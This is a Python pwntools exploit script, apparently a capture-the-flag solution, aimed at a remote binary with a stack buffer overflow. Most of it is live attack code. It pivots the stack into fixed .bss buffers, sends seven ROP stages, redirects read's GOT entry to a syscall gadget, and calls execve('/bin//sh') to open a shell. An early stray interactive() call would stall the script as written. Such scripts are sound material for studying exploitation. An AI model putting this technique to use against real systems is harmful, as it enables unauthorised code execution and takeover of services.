from pwn import *

context.arch = 'amd64'

#printf(rdi)
#read(rdi,rsi,rdx)
#get(rdi)

#first need to find the migration addr for buf1 buf2
#the offset to ret address is 40 bytes,so the rest 8 bytes -> 1 rop

#there is only one room of rop,by observing that rdx = 0x30,rax = 0 ,rsi = 'user input'.
#jump to main+70,call read(0,addr,48).
#with rop migration,there is unlimited rop chain, every chain has length 48/8 -> 8.

#buf1 -> 0x0601c00,buf2 ->0x0601d00

r = remote('127.0.0.1',8888)
#r = remote('csie.ctf.tw',10132)

r.recvuntil(':')
r.interactive()
buf1_addr = 0x0601b80
buf2_addr = 0x0601d00
buf3_addr = 0x0601e30
main_53_addr = 0x40062b     #lea    rax,[rbp-0x20]
main_70_addr = 0x40063c     #call   0x4004c0 <read@plt>
leave_ret = 0x400646        
read_plt = 0x4004c0
read_got = 0x601020         #got+0xe -> syscall

#push first rbp,jump to ,main+53 -> write rop2 48 byte to rbp-0x20,[rbp-0x20,rbp+0x10] ->
#write from buf1_addr - 0x20,write 0x30 (48) bytes,only 0x10(16) valid bytes start from buf1_addr
first_rbp = buf1_addr
second_rbp = buf1_addr
bof = 'X'*32 + flat( [first_rbp, main_53_addr])
r.send(bof)


pop_rdi = 0x4006b3
pop_rsi_r15 = 0x4006b1


rop1 = flat([buf1_addr,0x123,read_plt,pop_rsi_r15,buf1_addr-0x30, main_53_addr]) 
r.send(rop1)
rop2 = flat([0x11,0x22,0x33,0x44,0x123,pop_rsi_r15])
r.send(rop2)
rop3 = flat([buf1_addr+0x30,0x123,read_plt,pop_rsi_r15,buf1_addr+0x60,0x123])
r.send(rop3)
rop4 = flat([read_plt,0x4006aa,0,buf2_addr+0x48,buf1_addr+0x80,0xa0])
r.send(rop4)
rop5 = flat([buf2_addr,0,0x400690,buf2_addr+0x50,main_70_addr,read_plt])
r.send(rop5)
rop6 = '/bin//sh' + '\0'*8 + flat([0x4006aa,0,0,buf1_addr+0x88,0,0,buf2_addr,0x400690,0x4006aa,0,buf3_addr-0x8,buf1_addr+0x80,0x88,buf3_addr,0,0x400690,0xdeadbeef,0xfaceb00c])
r.send(rop6)
rop7 = flat([0x4006aa,0,buf3_addr+0x38,buf1_addr+0x80,1,read_got,0,0x400690,0x4006aa,0,buf2_addr+0x8,buf1_addr+0x88,0x3b,buf1_addr,0,0x4006aa,0xdeadbeef])
r.send(rop7)
r.send('\x2e')
r.send('x'*0x3b)

r.interactive()



